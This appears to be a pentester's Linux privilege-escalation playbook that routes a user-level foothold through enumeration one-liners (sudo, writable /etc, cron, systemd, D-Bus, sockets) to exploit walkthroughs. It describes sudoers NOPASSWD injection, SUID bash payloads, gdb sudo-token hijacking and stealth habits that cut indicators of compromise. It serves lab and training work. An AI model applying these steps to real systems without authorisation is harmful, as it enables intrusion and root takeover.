
Routes user-level Linux foothold to PrivEsc walkthroughs. Pure router — exploitation content lives in `Linux PrivEsc Walkthroughs/`. Post-root activities (credential extraction, persistence, lateral movement) out of scope.

Ordering: stealth-then-yield, with crash-risk vectors deferred. Zero-IOC checks first; filesystem scans late; kernel exploits second-to-last (crash risk); linpeas last (max IOC). Operator may deviate in lab/CTF context.

---

## Step 0 — Trivial root attempt

`su -`

When prompted for password, hit Enter (blank).

- Prompt returns `#` → root achieved. Done.
- "Authentication failure" → proceed.

---

## Step 1 — Sudo and group privileges

### Sudo:

`sudo -l`

- sudo -l lists a binary for which a GTFOBins entry exists with a `Shell` function AND the Shell function has a populated `Sudo` tab → [[Sudo Shell Escape]]
- `env_keep` includes `LD_PRELOAD` OR `LD_LIBRARY_PATH` → [[Sudo Environment Variables]]
- Nothing usable → proceed

### Writable sudoers policy:

⚠️ **Scope: file-axis only.** V_S dual-axis default carved out here — sudo validates each parsed file's owner (must be root) and mode (S_IWGRP/S_IWOTH silently skipped on parse). Foothold-owned files dropped into a writable `/etc/sudoers.d/` are rejected on parse; dir-write alone does NOT grant the primitive. File-axis via `test -w` catches the realistic vector (ACL-write on 0440 root:root file — base mode passes sudo's check, ACL grants foothold write).

⚠️ `[[Writable Sudoers]]` walkthrough body — build-when-encountered. Points to include: (1) sudo's parse validation — owner must be root, mode with S_IWGRP or S_IWOTH silently skipped with warning to stderr; (2) preflight `stat -c '%U:%G %a' <policy>` — abandon if owner != root OR mode has group/world write (sudo will parse-reject; chmod rescue is dead — non-owner cannot chmod, foothold-owned files fail sudo's owner check regardless of mode); (3) primary real vector is ACL-write on 0440 root:root file (`test -w` fires while stat mode alone shows 0440 — `getfacl` confirms user ACL entry); (4) payload = `<user> ALL=(ALL) NOPASSWD:ALL` appended, invoke `sudo -i`; (5) sudoers vs sudoers.d bounded fork on `<policy>` path only — single walkthrough covers both.

On **target:**

`test -w /etc/sudoers 2>/dev/null && echo "WRITABLE_SUDOERS: /etc/sudoers"; for f in /etc/sudoers.d/*; do [ -f "$f" ] || continue; test -w "$f" 2>/dev/null && echo "WRITABLE_SUDOERS_D: $f"; done; echo "SUDOERS_SCANNED"`

Route on output markers:

- `WRITABLE_SUDOERS: /etc/sudoers` → [[Writable Sudoers]], use `/etc/sudoers` as `<policy>`
- `WRITABLE_SUDOERS_D: <path>` → [[Writable Sudoers]], use `<path>` as `<policy>`
- `SUDOERS_SCANNED` with no preceding `WRITABLE_*` → check completed cleanly, no writable sudoers policy. Continue to next sub-block.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

### Sudo token hijack:

⚠️ `[[Sudo Token Hijack]]` walkthrough — build-when-encountered. Same-UID cached-token abuse via `gdb`/ptrace code injection into the user's shell process, riding a valid `/var/run/sudo/ts/<user>` (or `/var/db/sudo/ts/<user>`) timestamp created by the user's own recent legitimate sudo. Primary source: `nongiach/sudo_inject` (chaignc, 2019, EDB-46989). Metasploit module `exploit/linux/local/ptrace_sudo_token_priv_esc` (bcoles, 2019) covers the same primitive — ⚠️ MSF budget applies (one target across exam). Build must cover: (1) precondition triad — `ptrace_scope=0`, `gdb` on target, foothold user in sudoers, living same-UID process holding a valid cached token; (2) mechanism — `gdb` ptrace-attach to a same-UID interactive shell, inject `system("sudo -i")` (or `system("sudo <cmd>")`); sudo finds the cache bound to that PID/TTY and grants root without password; (3) token binding `(process start time + session id)` OR `(tty start time + tty session id)` — dead-process tokens cannot be stolen (unspoofable start time); (4) trigger is opportunistic — wait for legitimate user sudo to seed the cache. If foothold user has `sudo -l` NOPASSWD entries visible from the earlier `Sudo:` bullet, technique is redundant (use directly); (5) IOC — Elastic Security production rule "Potential Sudo Token Manipulation via Process Injection" fires on gdb → sudo uid-change chain; auditd `SYS_ptrace` catches attach; on-disk artefact = timestamp file mtime advance.

On **target:**

`cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo "0"; command -v gdb >/dev/null 2>&1 && echo "GDB_PRESENT" || echo "GDB_ABSENT"; echo "TOKEN_HIJACK_SCANNED"`

Route on output:

- `0` AND `GDB_PRESENT` → [[Sudo Token Hijack]] (walkthrough not built; deferred to build-when-encountered — see stub notes above).
- Value `1`, `2`, or `3` for ptrace_scope OR `GDB_ABSENT` → INAPPLICABLE, proceed to Groups.
- `TOKEN_HIJACK_SCANNED` with no preceding ptrace_scope value → paste did not execute cleanly. Retry.

### Groups:

`id`

- `docker` in groups → [[Docker Socket Abuse]]
- `lxd` or `lxc` in groups → [[LXD Socket Abuse]]
- `disk` in groups → [[Disk Group Escape]]
- None → proceed

---

## Step 2 — Container attack surface

### In-container detection:

`cat /proc/1/cgroup 2>/dev/null | grep -E 'docker|lxc|kubepods' && echo "IN_CONTAINER" || (test -f /.dockerenv && echo "IN_CONTAINER" || echo "NOT_IN_CONTAINER")`

- `IN_CONTAINER` → [[Container Escape to Host Root]]
- `NOT_IN_CONTAINER` → proceed

### Docker socket:

`test -w /var/run/docker.sock && echo "DOCKER_SOCK_WRITABLE"`

- `DOCKER_SOCK_WRITABLE` → [[Docker Socket Abuse]]
- No output → proceed

### LXD socket:

`for s in /var/lib/lxd/unix.socket /var/snap/lxd/common/lxd/unix.socket; do test -w "$s" && echo "LXD_SOCK_WRITABLE: $s"; done`

- `LXD_SOCK_WRITABLE: <path>` → [[LXD Socket Abuse]]
- No output → proceed to Step 3

---

## Step 3 — Sensitive file permissions

### Writable /etc/:

⚠️ **Scope: exploits enabled solely BY writable `/etc/` itself.** Vector is the containing-directory write primitive (unlink/rename/create against files directly under `/etc/`). File-axis writable checks on individual `/etc/` files (writable `/etc/shadow`, writable `/etc/ld.so.preload`, writable `/etc/sudoers.d/*`, etc.) live in their own steps and sub-blocks — do NOT extend this sub-block. `/etc/` subdirectories (`sudoers.d/`, `cron.d/`, `ld.so.conf.d/`, `init.d/`, `rc*.d/`, `dbus-1/`, `systemd/`) each have their own dir-axis checks in their respective home steps — do NOT extend this sub-block. Umbrella covers exclusively files directly under `/etc/`.

⚠️ `[[Exploit Shadow via Writable /etc]]` / `[[Exploit Passwd via Writable /etc]]` / `[[Exploit ld.so.preload via Writable /etc]]` / `[[Exploit Group via Writable /etc]]` / `[[Exploit Gshadow via Writable /etc]]` walkthrough bodies — build-when-encountered. Shared structure across all five: (1) trigger primitive: `/etc/` directory writable for foothold user, enabling unlink/rename/create against directly-contained files; (2) preflight sticky check: `ls -ld /etc` — if perm string shows `t` bit, foothold user cannot unlink or rename root-owned files inside `/etc/` (sticky restricts these to file-owner + dir-owner + root). Sticky `/etc/` narrows viable chains to create-new-when-absent only; sticky-blocked chains abandon at preflight; (3) deployment variants gated by target-file existence + sticky state — file present + not sticky → rename-swap (`mv /etc/<file> /etc/.<file>.bak`, drop attacker replacement); file present + sticky → chain blocked; file absent → create-new (writable `/etc/` allows this — creation is a valid deployment primitive even when the target file was absent originally, sticky-safe); (4) each walkthrough MUST handle both file-present and file-absent cases — do NOT abandon a chain because the target file is not there; the walkthrough creates it; (5) ownership tell: newly-created or renamed replacement files inherit foothold-user ownership (`ls -l` shows foothold uid, not `root`). Each walkthrough MUST include ownership-restore as first root action from the elevated shell (`chown root:<group> <file>` matching original ownership) to reduce IOC before further post-exploit work; (6) IOC: on-disk artefacts under `/etc/` (renamed backup files, newly-created attacker files); auditd (if enabled) captures the write; operator reverses before departure; (7) per-file specifics: **Shadow** — replacement contains attacker root hash (`openssl passwd -6` on attacker); trigger via `su -`; hash-gen + su-elevation construction identical to `[[Writable Shadow]]`, only the deployment primitive differs (rename-swap instead of in-place sed); **Passwd** — replacement adds UID-0 attacker user entry (or overwrites root entry with attacker-known hash); trigger via `su <name>`; entry construction identical to `[[Writable Passwd]]`, only the deployment primitive differs; **ld.so.preload** — file typically absent by default; create-new sticky-safe is the dominant case; payload construction and self-cleaning constructor discipline identical to `[[Dynamic Linker Preload Hijack]]` (Step 12 Sub-block 2) — reuse that walkthrough's payload guidance verbatim, only the deployment primitive differs.

On **target:**

`test -w /etc && { echo "WRITABLE_ETC_SHADOW"; echo "WRITABLE_ETC_PASSWD"; echo "WRITABLE_ETC_LDPRELOAD"; echo "WRITABLE_ETC_GROUP"; echo "WRITABLE_ETC_GSHADOW"; }; echo "ETC_SCANNED"`

Route on output markers:

- `WRITABLE_ETC_SHADOW` → [[Exploit Shadow via Writable /etc]]
- `WRITABLE_ETC_PASSWD` → [[Exploit Passwd via Writable /etc]]
- `WRITABLE_ETC_LDPRELOAD` → [[Exploit ld.so.preload via Writable /etc]]
- `WRITABLE_ETC_GROUP` → [[Exploit Group via Writable /etc]]
- `WRITABLE_ETC_GSHADOW` → [[Exploit Gshadow via Writable /etc]]
- `ETC_SCANNED` with no preceding `WRITABLE_ETC_*` → check completed cleanly, `/etc/` not writable. Continue to next sub-block.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

---

### Local account database:

`test -r /etc/shadow && echo "SHADOW READABLE" || echo "SHADOW NOT READABLE"`
`test -w /etc/passwd && echo "PASSWD WRITABLE" || echo "PASSWD NOT WRITABLE"`
`test -w /etc/shadow && echo "SHADOW WRITABLE" || echo "SHADOW NOT WRITABLE"` 
`test -w /etc/group && echo "GROUP WRITABLE" || echo "GROUP NOT WRITABLE"`
`test -r /etc/gshadow && echo "GSHADOW READABLE" || echo "GSHADOW NOT READABLE"`
`test -w /etc/gshadow && echo "GSHADOW WRITABLE" || echo "GSHADOW NOT WRITABLE"`

- `SHADOW READABLE` → [[Readable Shadow]]
- `PASSWD WRITABLE` → [[Writable Passwd]]
- `SHADOW WRITABLE` → [[Writable Shadow]]
- `GROUP WRITABLE` → [[Writable Group]]
- `GSHADOW READABLE` → [[Readable Gshadow]]
- `GSHADOW WRITABLE` → [[Writable Gshadow]]
- All six `NOT` → proceed

---

## Step 4 — Credential Harvesting

⚠️ Read-only filesystem enum for credential-bearing artefacts. Stealth-positive — bash history of read commands is the only IOC.

1. [[History Files]]
2. [[Config Files]]
3. [[SSH Keys]]
4. [[Process cmdline & environ]] — *stub; skip. Build canonically when first encountered in the wild — walkthrough + `~/scripts/proc_argenv_enum.sh` covering `/proc/*/cmdline` and `/proc/*/environ`, parallel to History Files / Config Files / SSH Keys.*
5. [[Process Memory Dumping]] — *stub; skip. Walkthrough not built — see [[Process Memory Dumping Walkthrough]] design note; deferred to build-when-encountered.*

All five exhausted with no elevation → proceed to Step 5.

---

## Step 5 — Scheduled execution

### Cron / anacron / at substrate:

On **attacker**:

`(echo "bash <<'EOF'"; sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d' ~/scripts/sched_enum.sh; echo "EOF") | xclip -selection clipboard`

(Wayland: substitute `wl-copy` for `xclip -selection clipboard`.)

Paste into target shell.

Route on output markers:

- `WRITABLE_SCRIPT[root,cron]: <path>` → [[Cron File Permissions]], use `<path>` as `<script>`
- `WRITABLE_SCRIPT[root,anacron]: <path>` → [[Anacron File Permissions]]
- `WRITABLE_SCRIPT[root,at]: <path>` → [[At-job File Permissions]]
- `RELATIVE_CMD[root,cron]: <cmd>` AND `WRITABLE_PATH_DIR[cron]: <dir>` both present → [[Cron PATH]]
- `RELATIVE_CMD[root,anacron]: <cmd>` AND `WRITABLE_PATH_DIR[anacron]: <dir>` both present → [[Anacron PATH]]
- `RELATIVE_CMD[root,at]: <cmd>` AND `WRITABLE_PATH_DIR[at]: <dir>` both present → [[At-job PATH]]
- `WILDCARD[root,cron]: <dir>:<file>:<line>:<body>` → [[Cron Wildcards]]
- `WILDCARD[root,anacron]: <dir>:<file>:<line>:<body>` → [[Anacron Wildcards]]
- `WILDCARD[root,at]: <dir>:<file>:<line>:<body>` → [[At-job Wildcards]]

### Logrotate config permissions:

Trigger-agnostic — logrotate runs via cron and/or systemd timer; the exploit fires on rotation regardless of which. Paste into target shell:

On **target:**

`test -w /etc/logrotate.conf 2>/dev/null && echo "WRITABLE_LOGROTATE_CONFIG: /etc/logrotate.conf"; test -w /etc/logrotate.d 2>/dev/null && echo "WRITABLE_LOGROTATE_CONFIG: /etc/logrotate.d"; for f in /etc/logrotate.d/*; do [ -f "$f" ] || continue; test -w "$f" 2>/dev/null && echo "WRITABLE_LOGROTATE_CONFIG: $f"; done`

Route on output markers:

- `WRITABLE_LOGROTATE_CONFIG: <path>` → [[Logrotate Config Permissions]], use `<path>` as `<config>`

### No route:

No markers from either block → no scheduled-execution PrivEsc route, proceed to Step 6

---

## Step 6 — Init system hijacking 

### Systemd unit files:

⚠️ **Build-when-encountered.** `~/scripts/systemd_enum.sh` is deferred — no script body exists yet. On first real-box encounter of this step: build the script from first principles against the live target (which is the canonical validation context), conforming to the marker contract below. The marker contract is the locked architectural shape only — specific marker names and field structure are likely to refine when the script is built against real systemd output. 

⚠️ **Build-time considerations for `systemd_enum.sh` marker breadth.** (a) `[root]` tag on file-based markers may over-filter — writable `.service` files not owned by root or currently configured `User=` non-root are still exploitable by flipping `User=root` + attacker `ExecStart`; trigger via boot / admin `daemon-reload` / socket-activation. Revisit at build. (b) Add `WRITABLE_SYSTEMD_UNIT_DIR: <dir>` marker for foothold-writable systemd config directories (`/etc/systemd/system/`, drop-in dirs) enabling drop-new-`.service` vector. Distinct from `WRITABLE_SYSTEMD_PATH_DIR` (execution-PATH env hijack, sibling of Cron PATH).

Once `~/scripts/systemd_enum.sh` exists, invoke per the `Scheduled execution` pattern:

On **attacker**: 

`(echo "bash <<'EOF'"; sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d' ~/scripts/systemd_enum.sh; echo "EOF") | xclip -selection clipboard`

(Wayland: substitute `wl-copy` for `xclip -selection clipboard`.) 

Paste into target shell. 

Route on output markers: 
- `WRITABLE_TIMER[root]: <path>` → [[Systemd Timer File Permissions]] 
- `WRITABLE_SERVICE[root]: <path>` → [[Systemd Service File Permissions]] 
- `WRITABLE_SOCKET[root]: <path>` → [[Systemd Socket File Permissions]] 
- `WRITABLE_DROPIN[root]: <path>` → [[Systemd Drop-in File Permissions]] 
- `WRITABLE_EXECSTART[root]: <path>` → [[Systemd ExecStart Hijack]] 
- `WRITABLE_SYSTEMD_PATH_DIR[root]: <dir>` → [[Systemd PATH]] 
- No output → continue to next sub-block.
### Init.d scripts:

⚠️ `[[Init.d Script Permissions]]` walkthrough body — build-when-encountered. Points to include: (1) trigger family is boot (rcS.d/rc*.d) + runlevel transitions (`init <N>`) + **admin** invocations (`service <name> {start|restart|stop}`), not reboot-only; (2) payload = SUID bash (`chmod 4755`), not `chmod +x`; (3) artefact naming + drop-dir per `[[Stealth Drop Dir Probe]]`; (4) writable-but-non-executable exploitable only if foothold user can `chmod +x` (owns file) — walkthrough discriminates; (5) manual invocation from foothold shell only inherits foothold uid.

On **target:**

`for f in /etc/init.d/*; do [ -f "$f" ] && test -w "$f" && echo "WRITABLE_INITD: $f"; done; echo "INITD_SCANNED: /etc/init.d/"`

Route on output markers:

- `WRITABLE_INITD: <path>` → [[Init.d Script Permissions]], use `<path>` as `<script>`
- `INITD_SCANNED: /etc/init.d/` with no preceding `WRITABLE_INITD` → check completed cleanly, no writable init.d scripts. Continue to next sub-block.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

### rc.local:

⚠️ `[[rc.local Permissions]]` walkthrough body — build-when-encountered. Points to include: (1) trigger family is boot-only (wired via S99rc.local at end of runlevel); (2) modern systemd distros ship `rc-local.service` with `ConditionFileIsExecutable=/etc/rc.local` — file needs execute bit for systemd to fire it; (3) payload = SUID bash (`chmod 4755`); (4) manual invocation from foothold shell inherits foothold uid — MUST wait for boot.

On **target:**

`[ -f /etc/rc.local ] && test -w /etc/rc.local && echo "WRITABLE_RC_LOCAL: /etc/rc.local"; echo "RC_LOCAL_SCANNED: /etc/rc.local"`

Route on output markers:

- `WRITABLE_RC_LOCAL: /etc/rc.local` → [[rc.local Permissions]]
- `RC_LOCAL_SCANNED: /etc/rc.local` with no preceding `WRITABLE_RC_LOCAL` → check completed cleanly, rc.local not writable or absent. Continue to next sub-block.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

### Runlevel symlink directories:

⚠️ `[[Runlevel Directory Symlink Drop]]` walkthrough body — build-when-encountered. Points to include: (1) trigger family is boot + runlevel transitions (`init <N>`); (2) exploit shape = drop new symlink `S99<name>` in writable rc*.d/ dir pointing to attacker-owned executable script (needs execute bit) — NOT edit existing file; (3) payload = SUID bash in symlink target; (4) artefact naming per `[[Stealth Drop Dir Probe]]`.

On **target:**

`for d in /etc/rc0.d /etc/rc1.d /etc/rc2.d /etc/rc3.d /etc/rc4.d /etc/rc5.d /etc/rc6.d /etc/rcS.d; do [ -d "$d" ] && test -w "$d" && echo "WRITABLE_RC_D_DIR: $d"; done; echo "RC_D_SCANNED"`

Route on output markers:

- `WRITABLE_RC_D_DIR: <dir>` → [[Runlevel Directory Symlink Drop]], use `<dir>` as `<rc_dir>`
- `RC_D_SCANNED` with no preceding `WRITABLE_RC_D_DIR` → check completed cleanly, no writable runlevel dirs. Continue to next sub-block.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

### No route:

No markers from any sub-block → no init-system-hijacking PrivEsc route, proceed to Step 7 
 
---

## Step 7 — Shell startup hijacking

⚠️ `[[Shell Startup File Permissions]]` walkthrough body — build-when-encountered. Include yield caveat: OSCP+/lab/CTF yield high (admin simulation triggers regularly on target boxes); real-engagement yield time-variable (production servers may go weeks between root interactive logins). Not a descope reason — vector is valid, timing is context-dependent.

On **target:**

`clear; r=$(getent passwd root 2>/dev/null | cut -d: -f7); [ -z "$r" ] && r=$(awk -F: '$1=="root"{print $7}' /etc/passwd 2>/dev/null); case "$r" in /sbin/nologin|/usr/sbin/nologin|/bin/false|/usr/bin/false) echo "SHELL_INIT_INAPPLICABLE: $r" ;; /bin/bash|/usr/bin/bash|/bin/rbash) for f in /etc/profile /etc/profile.d/*.sh /etc/bash.bashrc /etc/bashrc; do [ -e "$f" ] && test -w "$f" && echo "WRITABLE_SHELL_INIT: $f"; done; echo "SHELL_INIT_SCANNED: $r" ;; /bin/sh|/bin/dash) for f in /etc/profile /etc/profile.d/*.sh; do [ -e "$f" ] && test -w "$f" && echo "WRITABLE_SHELL_INIT: $f"; done; echo "SHELL_INIT_SCANNED: $r" ;; /bin/zsh|/usr/bin/zsh) for f in /etc/zsh/zshenv /etc/zsh/zprofile /etc/zsh/zshrc /etc/zsh/zlogin; do [ -e "$f" ] && test -w "$f" && echo "WRITABLE_SHELL_INIT: $f"; done; echo "SHELL_INIT_SCANNED: $r" ;; /bin/csh|/bin/tcsh) for f in /etc/csh.cshrc /etc/csh.login; do [ -e "$f" ] && test -w "$f" && echo "WRITABLE_SHELL_INIT: $f"; done; echo "SHELL_INIT_SCANNED: $r" ;; *) echo "SHELL_INIT_UNKNOWN_SHELL: $r" ;; esac`

Route on output markers:

- `WRITABLE_SHELL_INIT: <path>` → [[Shell Startup File Permissions]], use `<path>` as `<init_file>`
- `SHELL_INIT_INAPPLICABLE: <shell>` → interactive root login blocked. No shell-startup route. Proceed to Step 8.
- `SHELL_INIT_UNKNOWN_SHELL: <shell>` → root's shell not recognized. Log for manual investigation, proceed to Step 8.
- `SHELL_INIT_SCANNED: <shell>` **with no preceding `WRITABLE_SHELL_INIT`** → check completed cleanly, no writable init files for root's shell. Proceed to Step 8.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

---

## Step 8 — D-Bus hijacking

**Probe** — D-Bus presence:

On **target:**

`if [ -d /usr/share/dbus-1 ] || [ -d /etc/dbus-1 ]; then echo "DBUS_PRESENT"; else echo "DBUS_INAPPLICABLE: no /usr/share/dbus-1 or /etc/dbus-1"; fi`

Route on output markers:

- `DBUS_INAPPLICABLE: <path list>` → no D-Bus on this box, skip all sub-sections, proceed to Step 9
- `DBUS_PRESENT` → proceed to sub-sections below
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

### Policy files:

⚠️ `[[D-Bus Policy Permissions]]` walkthrough body — build-when-encountered. Points to include: (1) modern dbus-daemon (1.10+) watches policy directories via inotify and reloads automatically — attacker edits policy, next method call carries the new permission with no explicit trigger action needed; (2) older dbus-daemon needs SIGHUP, explicit `ReloadConfig` method call, or dbus-daemon restart to re-read config; (3) attack shape (existing file): add `<allow>` rule granting foothold uid permission to call privileged method; (4) attack shape (writable dir): drop new `.conf` file with attacker-crafted `<allow>` rules; (5) trigger: any D-Bus method call from foothold uid after policy reload — high-value targets include systemd's `StartTransientUnit`, polkit's action registration.

On **target:**

`for d in /etc/dbus-1/system.d /usr/share/dbus-1/system.d; do [ -d "$d" ] && test -w "$d" && echo "WRITABLE_DBUS_POLICY_DIR: $d"; for f in "$d"/*.conf; do [ -f "$f" ] && test -w "$f" && echo "WRITABLE_DBUS_POLICY: $f"; done; done; echo "DBUS_POLICY_SCANNED"`

Route on output markers:

- `WRITABLE_DBUS_POLICY: <path>` → [[D-Bus Policy Permissions]], use `<path>` as `<policy_file>`
- `WRITABLE_DBUS_POLICY_DIR: <dir>` → [[D-Bus Policy Permissions]], drop-new-file case, use `<dir>` as `<policy_dir>`
- `DBUS_POLICY_SCANNED` with no preceding `WRITABLE_DBUS_POLICY*` → check completed cleanly, no writable policy files or dirs. Continue to next sub-block.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

### Service activation files:

⚠️ `[[D-Bus Service Activation]]` walkthrough body — build-when-encountered. Points to include: (1) no daemon reload needed — dbus-daemon reads .service files on demand when a bus name is claimed; (2) attack shape (existing file): edit `Exec=` to attacker payload AND set `User=root`; (3) attack shape (writable dir): drop new `.service` with attacker-chosen bus name, `Exec=` payload, `User=root`; (4) payload template must include `User=root` — attacker sets execution uid, no upstream discrimination needed; (5) trigger: any client requesting the target bus name (`dbus-send --system --dest=<name> ...`).

On **target:**

`for d in /etc/dbus-1/system-services /usr/share/dbus-1/system-services /usr/local/share/dbus-1/system-services; do [ -d "$d" ] && test -w "$d" && echo "WRITABLE_DBUS_SERVICE_DIR: $d"; for f in "$d"/*.service; do [ -f "$f" ] && test -w "$f" && echo "WRITABLE_DBUS_SERVICE: $f"; done; done; echo "DBUS_SERVICE_SCANNED"`

Route on output markers:

- `WRITABLE_DBUS_SERVICE: <path>` → [[D-Bus Service Activation]], use `<path>` as `<service_file>`
- `WRITABLE_DBUS_SERVICE_DIR: <dir>` → [[D-Bus Service Activation]], drop-new-file case, use `<dir>` as `<service_dir>`
- `DBUS_SERVICE_SCANNED` with no preceding `WRITABLE_DBUS_SERVICE*` → check completed cleanly, no writable service activation files or dirs. Continue to next sub-block.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

### Main daemon config:

⚠️ `[[D-Bus Main Config Permissions]]` walkthrough body — build-when-encountered. Points to include: (1) modern dbus-daemon (1.10+) auto-reloads via inotify; older needs SIGHUP or `ReloadConfig` method call; (2) preferred attack: create `/etc/dbus-1/system-local.conf` if `/etc/dbus-1/` writable → sourced last, no conflict with vendor content, attacker fully controls policy; (3) legacy `/etc/dbus-1/system.conf` override also sourced with `ignore_missing="yes"` — same technique if `system-local.conf` unusable; (4) editing `/usr/share/dbus-1/system.conf` (vendor primary) is rare misconfig — same yield but higher IOC (touching vendor file); (5) payload: `<policy>` block granting foothold user's uid `<allow>` on high-value method (e.g. systemd's `StartTransientUnit`) → invoke method → root RCE via systemd.

On **target:**

`for f in /usr/share/dbus-1/system.conf /etc/dbus-1/system.conf /etc/dbus-1/system-local.conf; do [ -f "$f" ] && test -w "$f" && echo "WRITABLE_DBUS_CONF: $f"; done; [ -d /etc/dbus-1 ] && test -w /etc/dbus-1 && echo "WRITABLE_DBUS_CONF_DIR: /etc/dbus-1"; echo "DBUS_CONF_SCANNED"`

Route on output markers:

- `WRITABLE_DBUS_CONF: <path>` → [[D-Bus Main Config Permissions]], use `<path>` as `<conf_file>`
- `WRITABLE_DBUS_CONF_DIR: <dir>` → [[D-Bus Main Config Permissions]], drop-new-file case, use `<dir>` as `<conf_dir>`
- `DBUS_CONF_SCANNED` with no preceding `WRITABLE_DBUS_CONF*` → check completed cleanly, no writable config files or dirs. Continue to next sub-block.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

### No route:

No markers from any sub-block → no D-Bus hijacking PrivEsc route, proceed to Step 9

---

## Step 9 — AF_UNIX Socket Hijacking

⚠️ **Scope:** writable AF_UNIX domain sockets owned by non-foothold users. Foothold-owned sockets (own tmux, session-bus) excluded as self-comms. Docker/LXD sockets at standard paths are canonically enumerated at Step 2 (Container attack surface); this step backstops path variance and covers all other writable AF_UNIX socket exposures. Systemd `.socket` unit files are Step 6's home (different vector class — file-write triggering init, not IPC over the socket). Enumeration is bounded to `/var/run /run /tmp /var/lib /var/snap`.

⚠️ **Check identifies path-matched daemons; walkthroughs verify identity + UID before exploit.** The check dispatches by socket path pattern to known-exploitable-daemon walkthroughs. Path-based daemon identity is packaging convention — strong for standard packages, weakens for custom setups. Each walkthrough independently confirms daemon identity (banner probe) AND daemon UID (`/proc/<pid>/status` where readable + socket file owner as `bind()` fsuid proxy + behavioural probe as fallback) as preflight before executing the exploit chain — do NOT skip walkthrough preflight; the check identifies candidates by path, not confirmed exploits. Socket file owner is a ~95% reliable heuristic for daemon UID via `bind()` fsuid semantics; systemd socket activation is the residual break case (systemd binds as root, hands FD to service-user daemon). Both re-verified per socket in each walkthrough before the chain fires.

⚠️ **`[unknown]` bucket is speculative and dual-purpose.** The [[Unknown Daemon Socket Abuse]] walkthrough performs the same preflight discipline as the named-daemon walkthroughs (identity confirmation + UID verification per warning above), then attempts generic exploitation primitive families (arbitrary file-write, command execution, plugin/module load, config reload) against the unidentified daemon — no canonical chain, no guaranteed yield. Success is speculative. The walkthrough also carries a secondary refinement responsibility: if the identified daemon is reasonably reusable across future engagements (common upstream package, plausible re-encounter), on root canonicalise it (add path pattern to allowlist in `~/scripts/af_unix_sock_enum.sh` + build dedicated `[[<Daemon> Socket Abuse]]` walkthrough), on INAPPLICABLE-because-legit-by-design add path pattern to blacklist. Genuine one-offs (target-specific custom daemon that won't recur) don't earn canonicalisation — judgment call, not automatic. When canonicalisation IS earned, the check's precision compounds over vault lifetime.

⚠️ `[[Tmux Session Hijack]]` / `[[Screen Session Hijack]]` walkthroughs — build-when-encountered. Terminal multiplexer session takeover via writable server socket — foothold attaches to root-owned multiplexer session, lands shell in root context. Attach primitive: `tmux -S <socket> attach` / `screen -S <socket> -x`. Primary sources: `tmux(1)`, `screen(1)` man pages. Build must cover: (1) mechanism — modern tmux/screen check filesystem perms on the server socket at connect time; foothold with rw access to a root-owned socket lands a shell in the target's session context; (2) precondition — root ran multiplexer with `-S <custom_path>` (or `screen -U`/multiuser mode) resulting in a group-writable socket; default per-uid sockets (`/tmp/tmux-<uid>/`, `/run/screen/S-<user>/`) are per-uid-restricted and not the vector; (3) identity confirmation — verify socket is bound to a `tmux` or `screen` server process (`lsof -U <path>`, `ss -xnp | grep <path>`) before attaching; (4) attach + cleanup — attach with the primitive above, detach via prefix+`d` (tmux) / `Ctrl-a d` (screen) before exiting to avoid killing the session; (5) enum script update at build — `~/scripts/af_unix_sock_enum.sh` allowlist additions must use bound-process-comm signature (via `lsof -U` or peer lookup on the socket), not fixed path patterns, because attack vector is custom-`-S` paths, not defaults; (6) legacy CVE-track setuid/setgid vectors on old screen/tmux (int0x33 write-up) are OUT of scope for this walkthrough — separate CVE-specific walkthroughs if ever encountered.

On **attacker**:

`(echo "bash <<'EOF'"; sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d' ~/scripts/af_unix_sock_enum.sh; echo "EOF") | xclip -selection clipboard`

(Wayland: substitute `wl-copy` for `xclip -selection clipboard`.)

Paste into **target** shell.

Route on output markers:

- `WRITABLE_AF_UNIX_SOCK[docker]: <path>` → [[Docker Socket Abuse]], use `<path>` as `<socket>`
- `WRITABLE_AF_UNIX_SOCK[lxd]: <path>` → [[LXD Socket Abuse]], use `<path>` as `<socket>`
- `WRITABLE_AF_UNIX_SOCK[tmux]: <path>` → [[Tmux Session Hijack]] (walkthrough not built; deferred to build-when-encountered — see stub above).
- `WRITABLE_AF_UNIX_SOCK[screen]: <path>` → [[Screen Session Hijack]] (walkthrough not built; deferred to build-when-encountered — see stub above).
- `WRITABLE_AF_UNIX_SOCK[redis]: <path>` → [[Redis Socket Abuse]], use `<path>` as `<socket>`
- `WRITABLE_AF_UNIX_SOCK[memcached]: <path>` → no canonical chain, protocol has no code-execution primitive, take next marker
- `WRITABLE_AF_UNIX_SOCK[unknown]: <path>` → [[Unknown Daemon Socket Abuse]], use `<path>` as `<socket>`
- `AF_UNIX_SOCK_SCANNED` with no preceding `WRITABLE_AF_UNIX_SOCK[*]` markers → no writable AF_UNIX sockets, proceed to Step 10
- All markers exhausted with no elevation → proceed to Step 10
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.
---

## Step 10 — Root-owned services

⚠️ The enumeration command given below (`ps -ef.....`) will be sufficient on the majority of OSCP+/CTF/THM lab targets and typical engagement baselines. However, should this probe return completely empty on a target where root-runnable services are known-installed (e.g. mysql package present, no mysqld visible), OR if linpeas / other tool / any enumeration technique surfaces a root-runnable service that this probe missed (e.g. a systemd `ProtectProc=` hardened unit, or a socket-activated daemon idle at scan time), consult [[Root-owned Services Secondary Detection]] and build out its deferred pieces. When doing so, also audit [[Postgres UDF]] Step 1 (and any other walkthrough, below, with an internal ps-based UID preflight) for parallel structure to [[MySQL UDF]] Step 1's `mysqld OS user` block — specifically, a ps-based UID preflight will similarly fail on the ps-blind cases enumerated above (hidepid, `ProtectProc=`, socket-activated-idle). Where the same pattern is present, apply the same generalisation: a third bullet handling the ps-blind cases with the same deferred-UID-check fallback 